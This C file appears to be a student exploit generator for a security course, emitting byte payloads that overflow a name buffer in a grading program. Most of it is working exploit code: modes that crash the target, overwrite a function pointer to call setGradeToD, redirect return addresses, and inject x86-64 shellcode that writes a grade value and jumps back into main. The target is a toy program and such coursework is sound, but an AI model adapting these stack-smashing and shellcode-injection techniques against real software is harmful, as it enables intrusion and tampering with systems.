

#include <stdio.h>

int main(int argc, char *argv[]) {
	/* Attack e - Segmentation fault - Just flood the buffer with data, adds a \0 in between */
	if (argc > 1 && argv[1][0] == 'e')
	{
		int i = 0, max = 145;
		for(i = 0;i<max;i++){
			if(i==10)
				putc(0,stdout);
			else
				putc(65+i%26,stdout);
		}
	}
	/*Attack d - call setGradeToD function instead of checkName*/
	else if (argc > 1 && argv[1][0] == 'd')
	{
		putc(0x41,stdout);
		putc(0x52,stdout);
		putc(0x50,stdout);
		putc(0x49,stdout);
		putc(0x54,stdout);
		putc(0x00,stdout);
		/*Name ends here, following is some garbage data*/
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xa0,stdout);
		putc(0xe7,stdout);
		putc(0x58,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x12,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xd0,stdout);
		putc(0xe2,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0x7f,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xdf,stdout);
		putc(0x23,stdout);
		putc(0x27,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xa0,stdout);
		putc(0xe7,stdout);
		putc(0x58,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		/*Overwrite address of checkNames with setGradeToD*/
		putc(0xb8,stdout);
		putc(0x07,stdout);
		putc(0x40,stdout);	
	}
	/*Attack c - change return address to a point in main where grade is set to C*/
	else if (argc > 1 && argv[1][0] == 'c'){
		putc(0x41,stdout);
		putc(0x52,stdout);
		putc(0x50,stdout);
		putc(0x49,stdout);
		putc(0x54,stdout);
		putc(0x00,stdout);
		/*Name ends here, following is some garbage data*/
		putc(0x00,stdout);
		putc(0x43,stdout);
		putc(0x43,stdout);
		putc(0x30,stdout);
		putc(0x27,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xa0,stdout);
		putc(0xe7,stdout);
		putc(0x58,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x12,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xd0,stdout);
		putc(0xe2,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0x7f,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xdf,stdout);
		putc(0x23,stdout);
		putc(0x27,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xa0,stdout);
		putc(0xe7,stdout);
		putc(0x58,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x59,stdout);
		putc(0x08,stdout);
		putc(0x40,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x12,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x10,stdout);
		putc(0x06,stdout);
		putc(0x40,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xd0,stdout);
		putc(0xe2,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0x7f,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xd8,stdout);
		putc(0xe2,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0x7f,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		/*Return address of readString changed to a new Return address*/
		putc(0x1e,stdout);
		putc(0x08,stdout);
		putc(0x40,stdout);
	}
	/*Attack b - Set some code in buffer to get Grade B*/
	else if (argc > 1 && argv[1][0] == 'b'){
		putc(0x41,stdout);//1
		putc(0x52,stdout);
		putc(0x50,stdout);
		putc(0x49,stdout);
		putc(0x54,stdout);
		putc(0x00,stdout);//6
		
		putc(0x49,stdout);//7 Code Starts Here - mov $0x42, %r10
		putc(0xc7,stdout);
		putc(0xc2,stdout);
		putc(0x42,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);

		putc(0x4c,stdout);	//mov %r10, 0x600d84
		putc(0x89,stdout);
		putc(0x14,stdout);
		putc(0x25,stdout);
		putc(0x84,stdout);
		putc(0x0d,stdout);
		putc(0x60,stdout);
		putc(0x00,stdout);

		putc(0x49,stdout); //mov $0x400803, %r10
		putc(0xc7,stdout);
		putc(0xc2,stdout);
		putc(0x03,stdout);
		putc(0x08,stdout);
		putc(0x40,stdout);
		putc(0x00,stdout);

		putc(0x41,stdout); // jmp *%r10
		putc(0xff,stdout);
		putc(0xe2,stdout);

		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);//36 End of Name
		
		/* Garbage data follows */
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x12,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xc0,stdout);
		putc(0xe1,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0x7f,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xdf,stdout);
		putc(0x23,stdout);
		putc(0x27,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xa0,stdout);
		putc(0xe7,stdout);
		putc(0x58,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x59,stdout);
		putc(0x08,stdout);
		putc(0x40,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x12,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x10,stdout);
		putc(0x06,stdout);
		putc(0x40,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xc0,stdout);
		putc(0xe1,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0x7f,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xc8,stdout);
		putc(0xe1,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0x7f,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		
		/*Change Return Address to Name+6 */
		putc(0xc6,stdout);
		putc(0x0d,stdout);
		putc(0x60,stdout);						
	}
	/*Attack a - Get grade A, similar to Attck B, add return address to multiple places*/
	else if (argc > 1 && argv[1][0] == 'a'){
		putc(0x41,stdout);//1
		putc(0x52,stdout);
		putc(0x50,stdout);
		putc(0x49,stdout);
		putc(0x54,stdout);
		putc(0x00,stdout);//6

		putc(0x49,stdout);//7 Code Starts Here - mov $0x41, %r10
		putc(0xc7,stdout);
		putc(0xc2,stdout);
		putc(0x41,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);

		putc(0x4c,stdout);	//mov %r10, 0x600d84
		putc(0x89,stdout);
		putc(0x14,stdout);
		putc(0x25,stdout);
		putc(0x84,stdout);
		putc(0x0d,stdout);
		putc(0x60,stdout);
		putc(0x00,stdout);

		putc(0x49,stdout); //mov $0x400803, %r10
		putc(0xc7,stdout);
		putc(0xc2,stdout);
		putc(0x03,stdout);
		putc(0x08,stdout);
		putc(0x40,stdout);
		putc(0x00,stdout);

		putc(0x41,stdout); // jmp *%r10
		putc(0xff,stdout);
		putc(0xe2,stdout);

		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);//36 Thats it

		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x12,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xc0,stdout);
		putc(0xe1,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0x7f,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xdf,stdout);
		putc(0x23,stdout);
		putc(0x27,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xa0,stdout);
		putc(0xe7,stdout);
		putc(0x58,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);

		putc(0xc6,stdout);//Return Address to Name+6
		putc(0x0d,stdout);
		putc(0x60,stdout);						
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);

		putc(0xc6,stdout);//Return Address to Name+6
		putc(0x0d,stdout);
		putc(0x60,stdout);						
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);

		putc(0xc6,stdout);//Return Address to Name+6
		putc(0x0d,stdout);
		putc(0x60,stdout);						
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);

		putc(0xc6,stdout);//Return Address to Name+6
		putc(0x0d,stdout);
		putc(0x60,stdout);						
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);

		putc(0xc6,stdout);//Return Address to Name+6
		putc(0x0d,stdout);
		putc(0x60,stdout);						
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
	
		putc(0xc6,stdout);//Return Address to Name+6
		putc(0x0d,stdout);
		putc(0x60,stdout);						
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);

		putc(0xc6,stdout);//Return Address to Name+6
		putc(0x0d,stdout);
		putc(0x60,stdout);						
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);

		putc(0xc6,stdout);//Return Address to Name+6
		putc(0x0d,stdout);
		putc(0x60,stdout);						
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);

		putc(0xc6,stdout);//Return Address to Name+6
		putc(0x0d,stdout);
		putc(0x60,stdout);						
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);

		putc(0xc6,stdout);//Return Address to Name+6
		putc(0x0d,stdout);
		putc(0x60,stdout);						
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);


		putc(0xc6,stdout);//Return Address to Name+6
		putc(0x0d,stdout);
		putc(0x60,stdout);						
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
	}
	/*Attack s - changes return address of readString*/
	else if (argc > 1 && argv[1][0] == 's'){
		putc(0x41,stdout);
		putc(0x52,stdout);
		putc(0x50,stdout);
		putc(0x49,stdout);
		putc(0x54,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x43,stdout);
		putc(0x43,stdout);
		putc(0x30,stdout);
		putc(0x27,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xa0,stdout);
		putc(0xe7,stdout);
		putc(0x58,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x12,stdout);
		putc(0xd0,stdout);
		putc(0xe2,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0x7f,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xdf,stdout);
		putc(0x23,stdout);
		putc(0x27,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xa0,stdout);
		putc(0xe7,stdout);
		putc(0x58,stdout);
		putc(0xcf,stdout);
		putc(0x32,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x59,stdout);
		putc(0x08,stdout);
		putc(0x40,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x12,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x10,stdout);
		putc(0x06,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xd0,stdout);
		putc(0xe2,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0x7f,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0xd8,stdout);
		putc(0xe2,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0xff,stdout);
		putc(0x7f,stdout);
		putc(0x00,stdout);
		putc(0x00,stdout);
		putc(0x73,stdout);
		putc(0x29,stdout);
		putc(0x40,stdout);
	}
	else
	{
		putc(0x41,stdout);
		putc(0x52,stdout);
		putc(0x50,stdout);
		putc(0x49,stdout);
		putc(0x54,stdout);
		putc(0x00,stdout);
		
	}
}
